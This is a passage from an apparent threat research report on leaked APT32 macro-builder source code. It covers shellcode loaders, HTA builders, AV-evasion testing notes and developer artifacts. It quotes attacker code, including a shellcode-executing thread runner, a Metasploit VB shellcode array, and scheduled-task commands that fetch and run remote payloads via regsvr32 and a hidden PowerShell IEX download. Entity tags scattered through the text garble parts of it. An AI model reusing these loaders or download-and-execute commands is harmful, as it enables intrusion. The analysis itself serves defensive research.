and re - archived it using a modern WinRAR both with and without the high - precision flag , and the time there reflects a   [CARDINAL] 5 adjustment for the [ORG] UTC offset on our test system . We can convert any of these raw timestamps back to a human time to see the approximate modification time.1604/2022The origin story of APT32 macros [GPE] THREAT RESEARCH [CARDINAL] REPORTExamples of [CARDINAL] three possible archive timestamps made by WinRAR of different versions . Last Modified HexTime TypeHuman TimeWinRAR84 [CARDINAL] B1 19 4BMS DOS TIME    DATE8/25/2017 22 12 08 * [CARDINAL] 52 [ORG] DB [ORG] FE [CARDINAL] 19 [CARDINAL] 19 1E D3 01Windows FILETIME8/26/2017 [CARDINAL] 03 [CARDINAL] 12 0808 E7 A0 [CARDINAL] 59Unix time_t8/26/2017 03 12 084.x5.0 [CARDINAL] 5.0 * Nuanced : We can try doing it based on this approach , or we can try this ( easier ?   manual approach with the endian swap binary output in [ORG] CyberChef . To sum all of that up , we can guess based on the age of the StrikeSuit Gift RAR file that this was created with an old 4.x version of WinRAR , and we can confirm that with the structure of the archive headers and the format of the now deprecated DOS - style timestamps . Ok , let [NORP] \u2019s power forward to the good stuff . Unboxed source code projects at a glance To help us get a broad vision of all the source code in our [FAC] StrikeSuit [FAC] Gift package , we take a high - level look at the main projects . Parent Directory : P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1ProjectSummaryMacros_BuilderMacros_Builder.sln    [PERSON] Visual [PERSON] Studio 2012This [ORG] GUI program \u201c [WORK_OF_ART] Embed [WORK_OF_ART] Office [WORK_OF_ART] Macros \u201d was created in [DATE] 2016 and modernized in [DATE] August 2017.The main program defines macro file add_schedule_vba.txt as a resource , then the main routine takes that macro and replaces variables from things in [ORG] GUI and writes out to [ORG] MacrosSource.txt . The program has a separate functionality to take a [ORG] GUI selected file and use Trinet . Core . IO.Ntfs to write an [ORG] Alternate [ORG] Data [ORG] Stream   ADS   Zone Identifier to 2.1704/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder/ HtaDotNetHtaDotnet.sln    [PERSON] Visual [PERSON] Studio 2012This solution has several components . The [ORDINAL] first is the [ORG] HtaDotnet project which appears to have [ORG] UI components and serves as a framework to embed shellcode and file data into an [ORG] HTA document with either VB script or [ORG] JavaScript . This has [CARDINAL] two resource objects DotNet4Ldr and DotNetLdr which appear to be serialized versions of L.dll ( see [ORG] ShellcodeLoader , below).The Test project uses [ORG] HtaDotnet to manually build an [ORG] HTA file based on hard - coded paths for shellcode , a file , and a file name.byte [ ] shellcode = File . ReadAllBytes(@\"c:\\temp\\shl.bin \" ) ; byte [ ] embedFileData = File . [PERSON] ReadAllBytes(@\"c:\\temp\\bintext.exe \" ) ; string embedFileName = \" ( ) .exe \" ; \u2026 HtaDotNetBuilder builder = new HtaDotNetBuilder ( ) ; byte [ ] hta = builder . BuildHtaDotnetLdr(engine , embedFileData);File . WriteAllBytes(@\"c:\\temp\\11.hta \" , hta);WebBuilder/ ShellcodeLoaderL.sln    [PERSON] Visual [PERSON] Studio [DATE] 14 , [DATE] 14.0.25420.1 ( was migrated , see UpgradeLog.htm)This solution is a set of functions that help with decoding , decrypting , and running shellcode , including that which may be in a text in a .HTA or .VBS file . The L class is designed to take some script content and decode or decrypt it into shellcode and execute it . The Test piece uses the L class and takes an input shellcode file , an input loader file ( \u201c L.dll \u201d ) , [CARDINAL] two VB loader resources , and outputs into a text file.string inputShellcodeFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\_Temp\\shl.bin\";1804/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTstring inputLdrFile = @\"G:\\WebBuilder\\Gift_HtaDotNet\\ShellcodeLoader\\L\\bin\\release\\l.dl l \" ; string outputFile = @\"c:\\temp\\l.txt \" ; string vbsLdrCompatFile = @\"c:\\temp\\DotNetLdr \" ; string vbsLdrCompatFileDotNet4 = @\"c:\\temp\\DotNet4Ldr\";CSharp/ MacrosEmbeddingMacrosEmbedding.sln    [PERSON] Visual [PERSON] Studio [CARDINAL] 14 , 14.0.25420.1This [ORG] GUI program \u201c [WORK_OF_ART] Office [WORK_OF_ART] Macros [WORK_OF_ART] Builder \u201d was created in [DATE] 2013 . It checks [ORG] GUI for inputs of an Office ( .doc ) and a macro file ( .vb or .txt ) and attempts to embed macro into a file ( with some basic error handling ) and tries to adjust ADS zone identifiers to 0.CSharp/ MacrosEmbeddingExampleMacrosEmbeddingExample.sln    [PERSON] Visual [PERSON] Studio [DATE] 14 , [DATE] 14.0.25420.1This is likely a precursor or run alongside [ORG] MacrosEmbedding to test macros embedding functionality . It creates a simple VB macro text , has an embedMacro function to embed a macro into a doc , and the main function takes hard - coded paths from the developer system and runs it.string pathDoc = @\"C:\\Users\\Rachael\\Desktop\\MacrosTest.doc\";We see the function embedMacros from this expanded upon in both other CSharp/ solutions : MacrosEmbedding , and VbaCodeCreator . CSharp/ VbaCodeCreatorVbaCodeCreator.sln    [PERSON] Visual [PERSON] Studio [TIME] 14 , [TIME] 14.0.25420.1This [PERSON] Visual [PERSON] Studio project is used to generate VB macros that can be bundled into documents . The main program takes [CARDINAL] two hard - coded paths , one for shellcode and [CARDINAL] one for an Office document , then runs the core to build the shellcode into it.string strShellcodePath = [ORG] @\"D:\\P17028 [ORG] - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\Reference\\RawShellcode\\2017 - 08 - 23 02 - 55 - 49 string strOfficeFilePath = @\"C:\\Users\\Rachael\\Desktop\\test.doc \" ; [PERSON] Core . Core.startBuilder(strShellcodePath , strOfficeFilePath);1904/2022The origin story of APT32 macros [GPE] THREAT RESEARCH REPORTAlong with this project in the debug directory , we keep a copy of test.doc and a handful of legitimate [ORG] Microsoft [ORG] Office binaries to support the functionalities.Test.doc has a Module1.bas [PERSON] VBA code stream that uses an old public VB script template but then has a function for shellcode as an array . The shellcode in the existing test.doc is a test file similar , if not identical , to the \u201c [WORK_OF_ART] RawShellcode \u201d [WORK_OF_ART] BinaryBinary.sln    [WORK_OF_ART] Visual [WORK_OF_ART] Studio 2012This reads in a shellcode blob , converts the binary to text , and writes to an output .dat file.int main(int argc , char * * argv ) { std::string strFilePath = \" D:\\\\P17028 - StrikeSuit [ORG] Gift [ORG] -Office [ORG] Macro Type 1\\\\Reference\\\\RawShellcode\\\\2017 - 08 - 23 02 - 55 - 49 data = [ORG] Binary::ReadBinaryFile(strFilePath);Binary::ConvertBinaryToText(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellco [ORG] de.dat \" , data);C_Cpp/ ShellcodeThreadCallerShellcodeThreadCaller.sln    [PERSON] Visual [PERSON] Studio 2012This reads in shellcode from a hard - coded path and executes it . HANDLE hFile = CreateFileA(\"C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017 - 08 - 23 02 - 55 - 49 FILE_SHARE_READ , [ORG] NULL , OPEN_EXISTING , 0 , [ORG] NULL ) ; LPVOID lpShellcodeAddr = VirtualAlloc(NULL , dwFileSize , [PERSON] MEM_COMMIT [PERSON] | [PERSON] MEM_RESERVE , PAGE_EXECUTE_READWRITE ) ; HANDLE hThread = CreateThread(NULL , [DATE] 0 , ( LPTHREAD_START_ROUTINE)lpShellcodeAddr , [ORG] NULL , [DATE] 0 , [ORG] NULL ) ; WaitForSingleObject(hThread , INFINITE);VB/ ShellcodeLoaderShellcodeLoader.sln    [PERSON] Visual [PERSON] Studio 2012This is a different [ORG] ShellcodeLoader than the L.dll one in WebBuilder.2004/2022The origin story of APT32 macros THREAT RESEARCH REPORTIn this solution , the main [ORG] ShellcodeLoader.vb routine uses the Metasploit VB generated template ( \u00e0 la scriptjunkie ) , comments out the Meterpreter - esque shellcode array , and instead reads the local test shellcode blob as the main variable . Hyeyhafxp = My . Computer . FileSystem . ReadAllBytes(\"./2017 - 08 - 23 XmlScriptAnalystXmlScriptAnalyst.sln    [PERSON] Visual [PERSON] Studio 2012This appears to be a test project to test VB code against the local system and builds an XML scheduled task based on VB functions . When run , it grabs the local system computer and user name , then writes this into an XML string , which is then written out to a hard - coded path [GPE] XmlStr.txt . This relates to the XML functionality brought into an updated version of Macros_Builder . What \u2019s the deal with all this shellcode ? Interwoven through the [FAC] StrikeSuit [FAC] Gift package , amidst the varying projects , solutions , and macros , are a handful of shellcode blobs . Are they malware ? What are they ? Why are they here ? Let \u2019s find out . The [CARDINAL] one from [ORG] ShellcodeLoader.vb [ORG] File [ORG] Path : P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\Source\\VB\\ShellcodeLoader\\ShellcodeLoader\\ShellcodeLoader.vb File Size : [CARDINAL] 195b This array is the default shellcode blob originally seen in [ORG] ShellcodeLoader.vb , though it is commented out . 'Hyeyhafxp = { [CARDINAL] 232 , [CARDINAL] 137 , [DATE] 0 , [DATE] 0 , [DATE] 0 , [CARDINAL] 96 , [CARDINAL] 137 , [CARDINAL] 229 , [DATE] 49 , [CARDINAL] 210 , [CARDINAL] 100 , [CARDINAL] 139 , [DATE] 82 , [DATE] 48 , [CARDINAL] 139 , [DATE] 82 , [DATE] 12 , [CARDINAL] 139 , [DATE] 82 , [DATE] 20 , _ ' [CARDINAL] 139 , [CARDINAL] 114 , [DATE] 40 , [DATE] 15 , [CARDINAL] 183 , [DATE] 74 , [DATE] 38 , [DATE] 49 , [CARDINAL] 255 , [DATE] 49 , [CARDINAL] 192 , [CARDINAL] 172 , [DATE] 60 , [DATE] 97 , [DATE] 124 , [DATE] 2 , [DATE] 44 , [DATE] 32 , [CARDINAL] 193 , [CARDINAL] 207 , _ [DATE] ' [DATE] 13 , [CARDINAL] 1 , [CARDINAL] 199 , [CARDINAL] 226 , [CARDINAL] 240 , [DATE] 82 , [DATE] 87 , [CARDINAL] 139 , [DATE] 82 , [DATE] 16 , [CARDINAL] 139 , [DATE] 66 , [DATE] 60 , [CARDINAL] 1 , [CARDINAL] 208 , [CARDINAL] 139 , [DATE] 64 , [CARDINAL] 120 , [CARDINAL] 133 , [CARDINAL] 192 , _ ' [CARDINAL] 116 , [DATE] 74 , [CARDINAL] 1 , [CARDINAL] 208 , [DATE] 80 , [CARDINAL] 139 , [DATE] 72 , [DATE] 24 , [CARDINAL] 139 , [DATE] 88 , [DATE] 32 , [CARDINAL] 1 , [CARDINAL] 211 , [CARDINAL] 227 , [DATE] 60 , [DATE] 73 , [CARDINAL] 139 , [DATE] 52 , [CARDINAL] 139 , [CARDINAL] 1 , _ 2104/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORT'214 , [DATE] 49 , [CARDINAL] 255 , [DATE] 49 , [CARDINAL] 192 , [CARDINAL] 172 , [CARDINAL] 193 , [CARDINAL] 207 , [DATE] 13 , [CARDINAL] 1 , [CARDINAL] 199 , [DATE] 56 , [CARDINAL] 224 , [CARDINAL] 117 , [CARDINAL] 244 , [DATE] 3 , [CARDINAL] 125 , [CARDINAL] 248 , [DATE] 59 , [CARDINAL] 125 , _ ' [CARDINAL] 36 , [CARDINAL] 117 , [CARDINAL] 226 , [DATE] 88 , [CARDINAL] 139 , [DATE] 88 , [DATE] 36 , [CARDINAL] 1 , [CARDINAL] 211 , [CARDINAL] 102 , [CARDINAL] 139 , [DATE] 12 , [DATE] 75 , [CARDINAL] 139 , [DATE] 88 , [DATE] 28 , [CARDINAL] 1 , [CARDINAL] 211 , [CARDINAL] 139 , [DATE] 4 , _ ' [CARDINAL] 139 , 1 , [CARDINAL] 208 , [CARDINAL] 137 , [DATE] 68 , [DATE] 36 , [DATE] 36 , [DATE] 91 , [DATE] 91 , [DATE] 97 , [DATE] 89 , [DATE] 90 , [DATE] 81 , [CARDINAL] 255 , [CARDINAL] 224 , [DATE] 88 , [DATE] 95 , [DATE] 90 , [CARDINAL] 139 , [DATE] 18 , _ ' [CARDINAL] 235 , [CARDINAL] 134 , [DATE] 93 , [DATE] 106 , [CARDINAL] 1 , [CARDINAL] 141 , [CARDINAL] 133 , [CARDINAL] 185 , [DATE] 0 , [DATE] 0 , [DATE] 0 , [DATE] 80 , [ORG] 104 , [DATE] 49 , [CARDINAL] 139 , [CARDINAL] 111 , [CARDINAL] 135 , [CARDINAL] 255 , [CARDINAL] 213 , [CARDINAL] 187 , _ ' [CARDINAL] 224 , [DATE] 29 , [DATE] 42 , [DATE] 10 , [CARDINAL] 104 , [CARDINAL] 166 , [CARDINAL] 149 , [CARDINAL] 189 , [CARDINAL] 157 , [CARDINAL] 255 , [CARDINAL] 213 , [DATE] 60 , [DATE] 6 , [CARDINAL] 124 , [DATE] 10 , [CARDINAL] 128 , [CARDINAL] 251 , [CARDINAL] 224 , [CARDINAL] 117 , [DATE] 5 , _ ' [CARDINAL] 187 , [DATE] 71 , [DATE] 19 , [CARDINAL] 114 , [CARDINAL] 111 , [CARDINAL] 106 , [DATE] 0 , [DATE] 83 , [CARDINAL] 255 , [CARDINAL] 213 , [DATE] 99 , [DATE] 97 , [CARDINAL] 108 , [DATE] 99 , 0}With some fiddling we can take this array and , by using [ORG] Cyberchef , perform a From Decimal and dump snippet of shellcode up with the tool scdbg , we see that it probably is just a placeholder that uses [ORG] WinExec to open passed arguments . That makes sense because ( through Googling around the strings ) we can see that this shellcode is borrowed verbatim from several open source code projects surrounding [ORG] Metasploit [ORG] VB macros , like this blog post by [ORG] @scriptjunkie in [DATE] 2012 . It was later tweaked , forked , and copied into a variety of other macros and forms around the internet . The [CARDINAL] one from test.doc File Path : P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\Source\\CSharp\\VbaCodeCreator\\VbaCodeCreator\\bin\\Debug\\test.doc Size of Document : [CARDINAL] 1.13 MB ( [DATE] 1182720 bytes ) [PERSON] Size [PERSON] of [PERSON] Module1   [CARDINAL] 405757 This is a big document . We know from the context that this will likely have macro content . So , we open it up using oledump to look at the internal streams . We can see several chunks of macro content , many of which will need to be parsed out for us to read it more clearly.oledump test.doc1 : [CARDINAL] 114 ' [ORG] \\x01CompObj ' [CARDINAL] 2 : 4096 ' \\x05DocumentSummaryInformation ' [CARDINAL] 3 : 4096 ' \\x05SummaryInformation [DATE] ' [DATE] 4 : 7265 ' 1Table ' 5 : [CARDINAL] 460 ' Macros / PROJECT ' [CARDINAL] 6 : [CARDINAL] 95 ' [PERSON] Macros / PROJECTwm ' 7 : M [DATE] 682475 ' [PERSON] Macros / [ORG] VBA / [ORG] Module1 [ORG] ' [CARDINAL] 8 : m 459686 ' Macros / VBA / NewMacros'2204/2022The origin story of APT32 macros THREAT RESEARCH REPORT9 : m [CARDINAL] 948 ' [PERSON] Macros / VBA / ThisDocument ' [CARDINAL] 10 : [CARDINAL] 4190 ' [PERSON] Macros / VBA/_VBA_PROJECT [DATE] ' [DATE] 11 : [CARDINAL] 623 ' [ORG] Macros / [ORG] VBA / dir ' [CARDINAL] 12 : [CARDINAL] 4096 ' [ORG] WordDocument'The embedded macro is easy to carve out , thanks to Didier Steven \u2019s outstanding oledump tool . When we extract Module1 , we see the VB script with functions that itemize out a [CARDINAL] two - dimensional array that is later re - assembled and executed from [CARDINAL] 30 shellcode functions and [CARDINAL] nearly [CARDINAL] 1500 sub - arrays . After we extracted and converted the arrays , we ended up with a shellcode buffer . When the shellcode is executed , we get a pop - up box that tells us [ORG] DllMain has been executed successfully ! [GPE] Huzzah . The [CARDINAL] one from [ORG] RawShellcode [ORG] File [ORG] Path : P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\Reference\\RawShellcode\\ File size 72.99 [PERSON] KB ( 74740 bytes ) We spelunked through all the source code and saw many references to what we believe is this file . This piece of shellcode , hereafter referred to as \u201c the blob , \u201d is cited in [ORG] ShellcodeThreadCaller / Main.cpp2304/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTunder the path C:\\\\Users\\\\Rachael\\\\Desktop\\\\2017 - 08 - 23 02 - 55 - 49 In VbaCodeCreator / Program.cs the blob is referenced under the path D:\\P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type 1\\Reference\\RawShellcode\\2017 - 08 - 23 02 - 55 - 49 This blob is also referenced in [ORG] P17028 [ORG] - [ORG] StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1 / Source / C_Cpp / Binary / Binary / Main.cpp , which parses this file and converts each byte into an integer value . The converted file is saved to \" C:\\\\Users\\\\Rachael\\\\Desktop\\\\shellcode.dat \" . And in VB / [ORG] ShellcodeLoader / [ORG] ShellcodeLoader.vb , the default shellcode array from the [GPE] Metasploit post is commented out , and instead , blob is to be read in as Hyeyhafxp = My . Computer . FileSystem . ReadAllBytes(\"./2017 - 08 - 23 02 - 55 - 49 With a name so specific , and having also located a file by this name within the overall package , we are probably safe in assuming that the references within the source are indeed the file with MD5 assumption that this developer is using this blob for testing and trying to make sure that this piece of shellcode works within all of their tooling . But what is this blob , exactly ? Let \u2019s find out . Looking at the blob alone , we can see that it does not have a sort of standard file header . Starting at offset [CARDINAL] 0x00C0 , there are parts of a Windows PE header , which is always a good indication that we may be looking at an executable file wrapped in a shellcode loader.000000a0 : aa7a [DATE] a105 [DATE] 78fb 0bf9 [CARDINAL] 5a45 [ORG] df5a 7fe1 d104 .z x ZE.Z 000000b0 : [CARDINAL] 75f7 [CARDINAL] 5aed [CARDINAL] 08e2 fbf8 [ORG] 94f8 [ORG] ae87 [DATE] 0e1f ba0e u. Z [CARDINAL] 000000c0 : 00b4 09cd [CARDINAL] 21b8 014c cd21 5468 6973 2070 ! L.!This p [CARDINAL] 000000d0 : 726f [CARDINAL] 6772 616d 2063 [CARDINAL] 616e 6e6f 7420 6265 rogram can not be 000000e0 : [DATE] 2072 756e 2069 6e20 [CARDINAL] 444f 5320 6d6f [DATE] 6465 run in DOS mode 000000f0 : 2e0d 0d0a 2400 0000 0000 0000 4073 b402 $ @s 00000100 : [CARDINAL] 0412 [ORG] da51 0412 [ORG] da51 0412 [ORG] da51 1f8f 4451 Q Q Q DQWhen we load this up in a disassembler like [PERSON] IDA [PERSON] Pro , the [ORDINAL] first [CARDINAL] four bytes at the start of the file are converted to a call instruction . A subsequent call leads to a function at offset 0xF684 , which is responsible for decoding the remaining payload of the blob.2404/2022The origin story of APT32 macros THREAT RESEARCH REPORTAs we started reverse engineering this shellcode function to understand how the payload is deployed at a granular level , we identified a [DATE] 2019 blog post from Qi Anxin about this group 's [ORG] HTA downloaders . They had analyzed a version of this shellcode loader , and our findings were consistent . However , unlike their findings , our shellcode did not deploy a remote access tool , but presented us with a message box saying , \u201c [ORG] DllMain has been executed successfully ! \u201d . At this point , we see that the blob payload is a generic executable created to test their loaders without risking self - infection or making callouts to live C2 infrastructure . While this seems obvious and sensible , there are several assessments we can make from this knowledge . The [ORDINAL] first is their development capabilities are not the same as those conducting the attacks . This is also supported by the aforenoted use of GUIs , which can easily be used by less technical operators conducting attacks . Furthermore , the development team is sharp enough not to test their kit using actual offensive tooling , reducing the risk of accidentally leaking a final payload . The careful handling does not necessarily imply that they are an apex predator , yet it shows that this developer took some basic steps to avoid accidentally leaking sensitive information . But no matter the sophistication , malware developers are always human , and all humans make mistakes . The typical VB macro content For most of the macro content across all the [PRODUCT] StrikeSuit [PRODUCT] Gift projects , the macros were mainly used to create scheduled tasks that would download additional payloads in a couple of ways . [CARDINAL] One way uses the [GPE] regsvr32.exe remote download technique that is sometimes referred to as \u201c Squiblydoo . \u201dsCMDLine = \" schtasks /create /sc MINUTE /tn \" \" [WORK_OF_ART] Windows [WORK_OF_ART] Media Sharing \" \" /tr \" \" \\\"\"regsvr32.exe\\ \" \" /s /n /u /i : url scrobj.dll \" \" /mo AAAREGSVR32AAA\"The other way uses an XML scheduled task with rundll32.exe and arguments to have mshta execute VB script that would run a [ORG] PowerShell download.2504/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORT < Command > rundll32.exe</Command > < Arguments > mshta vbscript : Execute(\"CreateObject(\"WScript . Shell\").Run\"powershell.exe -nop -w hidden -c \" \" [ORG] IEX ( ( new - object net.webclient).downloadstring('url \" \" \" , [CARDINAL] 0 : code close\")</Arguments>2604/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH REPORTChapter IV2704/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTStrikeSuit malware development conventions When reacting to intrusions and campaigns around the world , analysts and researchers are often left to speculate on the adversary \u2019s capabilities , the tradecraft involved , and the details surrounding the original malware development environment . However , when we have the source code , we get a better picture of what was going on behind the scenes . What we see here largely matches our expectations , and yet we learn that malware developers are really no different than your everyday software developers . Documenting antivirus and compatibility testing Whether you work in IT or in a SOC , whether you throw down on NTFS or pcap , whether you work in Sublime or [WORK_OF_ART] VS [WORK_OF_ART] Code , you are probably stuck in a world of note - taking , testing , and documentation . Those developing malware face the same challenges in terms of planning , assessing efficacy , and tracking bugs and enhancements over time . In the [PRODUCT] StrikeSuit [PRODUCT] Gift package , we see evidence of the malware development team performing testing of Office documents on a select set of antivirus solutions . The verbatim excerpt below is from the file AVs [LAW] - Test / [LAW] Result.txt and demonstrates that this developer \u2019s macro solution was absolutely crushing AV as of [DATE] August [DATE] 24 , [DATE] 2017 . * AV update ngay 2017/08/24- 360 CN - 360 Total Security - Windows DefenderOffice 2010 x86OOOOO OTrojan [ORG] - Downloader . Script . GenericO O2804/2022The origin story of APT32 macros THREAT RESEARCH REPORTMany of these names you are familiar with and some acronyms for household names . For those that are n\u2019t obvious , [ORG] KIS is likely [PERSON] Kaspersky , and [ORG] NIS is probably [ORG] Norton . It \u2019s worth highlighting [CARDINAL] two lesser - known names in the list above : \u25cf BKAV may be a reference to [ORG] Bkav [ORG] Corporation which is one of the more popular antivirusproviders in [GPE] Vietnam ( url \u25cf [ORG] CMC may be a reference to [ORG] CMC [ORG] Cyber [ORG] Security , another [GPE] Vietnam - centered antivirus provider(url antivirus testing , we see that the malware developers were assessing compatibility with a handful of [ORG] Microsoft [ORG] Office versions . The excerpt below is from [ORG] Office [ORG] - Versions / Verions.txt , and it is clear that the tooling needs some enhancements . Work : - Office 2010 x86 - Office 2013 x86 - Office [DATE] 2016 x86Fail : - Office [DATE] 2010 x64 ( Type mismatch ) - Office [DATE] 2013 x64 ( Type mismatch ) - Office [DATE] 2016 x64 ( Type mismatch)Feature testing , housekeeping , and fingerprints Throughout the source codebase we see common conventions of software development . Malware developers face many of the same technological and organizational challenges as any software developer . They need to test small features and build incremental capabilities that work together . They need to keep their folder trees tidy , and they need to back up their code in case they make any catastrophic mistakes . They need to keep track of their tasks , their OKRs , and MBOs . They \u2019re doing the same job , just on the other side of the grind . They \u2019re only human , and accordingly , they ca n\u2019t help but leave dirty fingerprints across all their digital work . Cleaning up the development mess with _ [ORG] Cleanup.bat [ORG] Along with the Macros_Builder project , we find a batch file named _ [PERSON] Cleanup.bat that appears designed to delete unnecessary artifacts from the development system . According to 7 - zip , the last2904/2022The origin story of APT32 macros THREAT RESEARCH REPORTmodified time is sometime around 2013 - 10 - 29 00:18 , so perhaps this cleanup script was used and copied around from drive to drive , project to project , to allow the developers to quickly scrub their workstations or directories as needed . File Path : P17028 - StrikeSuit [ORG] Gift [ORG] - [ORG] Office [ORG] Macro [ORG] Type [ORG] 1\\Reference\\Macros_Builder\\ File Name : _ [PERSON] Cleanup.bat [PERSON] File Size : [CARDINAL] 3840 This excerpt of _ [PERSON] Cleanup.bat begins with a warning , and a commented out loop for deleting [ORG] Visual [ORG] Studio [ORG] Solutions [ORG] User [ORG] Options ( .SUO   files , after which there is a long list of for loops with different files to delete.@echo off echo Warning ! ! This file can delete wanted / needed files ! Use with caution ! echo Hit enter to continue using this file , or close it if you do not want to run it . REM pausefor /f \" tokens=1 [CARDINAL] delims= \" % % a in ( ' dir /b /s * .ncb ' ) do ( del /Q \" % % a \" echo % % a deleted . ) REM Do nt delete config of VS REM ///////////////////////////////////////////////////////////////////////// REM for /f \" tokens=1 [CARDINAL] delims= \" % % a in ( ' dir /b /s /A : H * .suo ' ) do ( REM attrib -H \" % % a \" REM del /Q \" % % a \" REM echo % % a deleted . REM ) [PERSON] REM /////////////////////////////////////////////////////////////////////////Neither the exact batch scripting nor the file types are particularly illuminating . This does n\u2019t look like a malware developer \u201c covering their tracks \u201d but rather a tidy programmer wanting an easy , scriptable way to delete chaff that may come from different versions of [PERSON] Visual [PERSON] Studio and different linkers and compilers and code artifacts that span many generations of development technology.3004/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTFile names or extensionsNote*.ncb*.suo*.tlh*.tli*.sdf*.userVisual C    [ORG] IntelliSense [ORG] DatabaseVisual [ORG] Studio [ORG] Solutions [ORG] User [ORG] Options ( excluded)C / C    Type Library HeaderC / C    Type Library ImplementationVisual Studio [PERSON] Code [PERSON] Browser [PERSON] DatabaseVisual [PERSON] Studio [PERSON] User Options*BuildLog.htmVisual Studio Build Log ( pre [PERSON] - VS2010 * .ilk*.pdb*.idb*.obj*.pch*.ipch*.tlogVisual Studio Incremental LinkingProgram Database / Debug SymbolsVisual Studio Intermediate Debug FileVisual Studio ObjectPrecompiled HeaderIntelliSense Precompiled [CARDINAL] HeaderMSBuild [ORG] File [ORG] Tracker Log*.vshost.exeVisual Studio Hosting IDE Process*.vshost.exe.configVisual Studio Hosting IDE Process*.vshost.exe.manifestVisual Studio Hosting IDE Process*.old*.stdafx.obj*.exp ? [PERSON] Visual [PERSON] Studio Precompiled [ORG] Header [ORG] ObjectExported [ORG] Functions Data*.Build . CppClean.logCPPClean [PRODUCT] Task [PRODUCT] Log   ? 3104/2022The origin story of APT32 macros THREAT RESEARCH [PERSON] REPORT*.lastbuildstateMSBuild   ? * .intermediate.manifestVisual [PERSON] Studio Manifest*.embed.manifestVisual [ORG] Studio [ORG] Manifest*.embed.manifest.resVisual [ORG] Studio [ORG] Manifest*mt.dep*.Cache*Properties . Resources.resou [ORG] rces*Form1.resources*csproj . FileList.txtVisual [PERSON] Studio [PERSON] ManifestVisual [PERSON] StudioVisual [PERSON] StudioVisual [PERSON] StudioVisual Studio*.csproj . FileListAbsolute.txtVisual Studio*.sbr*.bscVisual [PERSON] Studio [PERSON] Intermediate Symbolic DataVisual [PERSON] Studio [PERSON] Browser [PERSON] Symbol DataWe could n\u2019t find much evidence of this batch file in other places , but we came up lucky on a [GPE] Github search and arrived at this page , which has a nearly word - for - word copy of the batch script functionality : url There are only slight differences between [ORG] StrikeSuit \u2019s _ [PERSON] Cleanup.bat and aangaymoi \u2019s .sln.clean.bat script . The former has the .SUO loop commented out and was present back in [DATE] 2017 , whereas the latter was saved to [PERSON] Github in [DATE] 2021 and does not exclude the .SUO deletion . Still , in the [PRODUCT] StrikeSuit [PRODUCT] Gift package , it seems as though the _ [PERSON] Cleanup.bat script was never run . So , we will let this investigative thread dangle in the wind for now and move on to look at the artifacts of the development process such as the .SUO files . Visual Studio Solution User Options ( .suo ) analysis We were lucky enough to capture a copy of the source code package before the _ [PERSON] Cleanup.bat script was run , so we obtained copies of lots of nitty - gritty files that come along with [PERSON] Visual [PERSON] Studio development , including [ORG] Solution [ORG] User [ORG] Options ( .suo ) files . This is uncommon , and these files are not3204/2022The origin story of APT32 macros THREAT RESEARCH REPORTparsed by common aftermarket tooling , so we are left exploring the data structures to look for interesting tidbits that we might tease out of the saved states of each of the solutions . navigate through the portions of the SUO data structure.3304/2022The origin story of APT32 macros [ORG] THREAT [ORG] RESEARCH [ORG] REPORTRunning through all the SUO file structures is laborious and did n\u2019t yield much more than a string dump would have done anyway . We find paths to source code files , project names , etc . We can infer from the myriad of references in [PERSON] XmlPackageOptions , OutliningStateDir , etc . , that the [ORG] HtaDotnet and [ORG] ShellcodeLoader solutions were originally under the folder path G:\\WebBuilder\\Gift_HtaDotnet\\. This is also supported by the [ORG] PDB paths of older built binaries within the broader [PRODUCT] StrikeSuit [PRODUCT] Gift package . From looking at [PRODUCT] DebuggerWatches values in other projects , we can see that the malware developer was actively debugging the historical programs . SUO fileDebuggerWatchesWebBuilder / HtaDotNet / HtaDotnet.v11.suoWebBuilder / ShellcodeLoader/.vs / L / v14/.suoWebBuilder / ShellcodeLoader / L.suoresult(char)77(char)773404/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe examination of SUOs was a fruitless exercise and something of a dead end , but it was an important one to capture . Not all investigative threads turn up DNA and fingerprints . Sometimes they are just another vignette and another ephemeral glimpse into the elusive life of a malware author . There \u2019s nothing mind - blowing from this SUO inspection because these structures do not give us any great insights that the source code does not already provide . However , should you happen to find .SUO files without accompanying source code , these files could be rich in information about the [PERSON] Visual [PERSON] Studio solution , the malware author , or the original development environment . Development in progressTesting features and functions Analysis of this source code package is messy because it is non - linear and involves multiple timelines . Still , we see the iterative nature of development and how the malware authors tried and tested small capabilities before integrating them into other projects . Development was clearly in progress at the time this package was leaked , and we can see a few examples of this . For example , XmlStrAnalyst was a simple VB project to write an XML scheduled task to disk . This project was built around 8/16/2017 . It appeared as a precursor to the functionality that was later pushed as an enhancement into the updated version of Macros_Builder , which was modified to use XML scheduled tasks . Backup structure Obviously , when you expand upon a piece of older code that works , you do n\u2019t want to mess it up with alterations . What \u2019s the first thing you do ? You back it up ! The malware developer working on this project created archive copies of [CARDINAL] WebBuilder.rar and [GPE] Macros_Builder.zip to protect these older , working projects . Macro comparisons There were [CARDINAL] two different versions of [ORG] MacrosSource.txt in the source code package . We see active development and testing of the macro content through diffing these files.3504/2022The origin story of APT32 macros THREAT RESEARCH REPORTPath in P17028    [FAC] StrikeSuit [FAC] Gift    [ORG] Office [ORG] Macro [ORG] Type 1\\Reference\\SizeRAR mod 